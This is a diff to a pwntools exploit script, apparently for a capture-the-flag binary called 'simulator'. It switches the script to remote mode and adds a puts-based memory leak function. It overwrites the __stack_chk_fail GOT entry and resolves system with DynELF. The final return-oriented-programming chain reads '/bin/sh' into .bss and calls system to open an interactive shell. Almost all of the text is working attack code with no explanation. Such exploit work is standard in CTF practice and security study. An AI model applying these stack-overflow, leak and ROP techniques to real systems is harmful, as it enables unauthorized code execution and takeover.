@@ -16,7 +16,7 @@ pwn_rop = rop.ROP(pc)
 
 
 uselibc = 1 #0 for no,1 for i386,2 for x64
-local = 1
+local = 0
 haslibc = 0
 atta = 0
 
@@ -51,7 +51,7 @@ context.log_level = True
 
 if local:
 	if atta:
-		gdb.attach(p,'b *0x0804AF3B')
+		gdb.attach(p,'b *0x0804AA49')
 		#b *0x0804887F \n 
 		#0x400b6a
 
@@ -84,6 +84,38 @@ def sa(a,b):
 
 def sla(a,b):
 	p.sendlineafter(a,b)
+
+puts_plt = pwn_elf.plt['puts']
+vul_func = 0x0804AB88
+pop_ret = 0x08048545
+data = ''
+
+def leak(address,length=4):
+	global data
+	sl('END')
+	#tmp = rl()
+	#print 'tmp' + tmp
+	if(address%0x100 == 0xa):
+		address = address + 1
+	payload = 'A'*0x30
+	payload += p32(puts_plt) + p32(pop_ret) + p32(address)
+	payload += p32(vul_func)
+	sla('comment: ',payload)
+	up = ''
+	buf = ''
+	while True:
+		c = p.recv(numb=1, timeout=1)
+		#count += 1
+		if up == '\n' and c == "":
+			buf = buf[:-1]
+			buf += "\x00"
+			break
+		else:
+			buf += c
+		up = c
+	data = buf[:4]
+	print "%#x => %s" % (address, (data or '').encode('hex'))
+	return data
 
 def change_2_data():
 	sl('.data')
@@ -118,6 +150,9 @@ def hack():
 	fgets_got = pwn_elf.got['fgets']
 	fgets_plt = pwn_elf.plt['fgets']
 	puts_plt = pwn_elf.plt['puts']
+	strncmp_got = pwn_elf.got['strncmp']
+	strncmp_plt = pwn_elf.plt['strncmp']
+	mmap_got = pwn_elf.got['mmap']
 	stack_chk_fail_got = pwn_elf.got['__stack_chk_fail']
 	addr_bss = pwn_rop.section('.bss') + 0x200
 	
@@ -128,15 +163,9 @@ def hack():
 	pop_ret = 0x08048545
 	ppp_ret = 0x0804b339
 	mapp0 = 0x4000000
+	ret = 0x0804852e
+
 	# step 1: overwrite __stack_chk_fail's got to the address of ret
-	
-	# Method 1: use add/sub
-	# change_2_text()
-	# offset = ((stack_chk_fail_got - register_val) & 0xffffffff )/8-0x20
-	# print hex(offset) 
-	# code = 'add '+str(offset)+','+str(leave_ret)+','+str(0)
-	# input_code(code)
-	# sl('END')
 	
 	# Method 2: use lw/sw
 	change_2_text()
@@ -148,33 +177,31 @@ def hack():
 	input_code(code)
 	code = 'sw $t0,$t1'
 	input_code(code)
-	sl('END')
 
 	# step 2: 
-	# Method 1: use dl_resolve
+	# Method 2: use DynELF
+	d = DynELF(leak, elf=ELF('./simulator'))
+	system_addr = d.lookup('system', 'libc')
+	lg('system_addr',system_addr)
+	libc.address = system_addr - u32(data)
+	lg('libc_addr',libc.address)
 	
-	# step 2.1: leak the value of stdin
-	offset = 0x30
-	payload = pwn_rop.retfill(offset)
+	# leak the value of stdin
+	sl('END')
+	payload = 'A'*0x30
 	payload += p32(puts_plt) + p32(pop_ret) + p32(stdin_addr)
 	payload += p32(vul_func)
 	sla('comment: ',payload)
 	stdin_addr = u32(rv(4))
 	lg('stdin_addr',stdin_addr)
 
-	# step 2.2: dl_resolve
+	# execute system('/bin/sh')
 	sl('END')
-	payload = pwn_rop.retfill(offset)
-	payload += pwn_rop.call(fgets_plt, addr_bss, 100, stdin_addr)
-	payload += pwn_rop.dl_resolve_call(addr_bss + 20, addr_bss)
+	sh_addr = addr_bss
+	payload = 'A'*0x30 + p32(fgets_plt) + p32(ppp_ret) + p32(sh_addr) + p32(8) + p32(stdin_addr)
+	payload += p32(system_addr) + p32(vul_func) + p32(sh_addr)
 	sla('comment: ',payload)
-
-	payload = pwn_rop.string('/bin/sh')
-	payload += pwn_rop.fill(20, payload)
-	payload += pwn_rop.dl_resolve_data(addr_bss + 20, 'system')
-	payload += pwn_rop.fill(100, payload)
-	sl(payload)
-	
+	sl('/bin/sh\0')
 	p.interactive()
 
 hack()
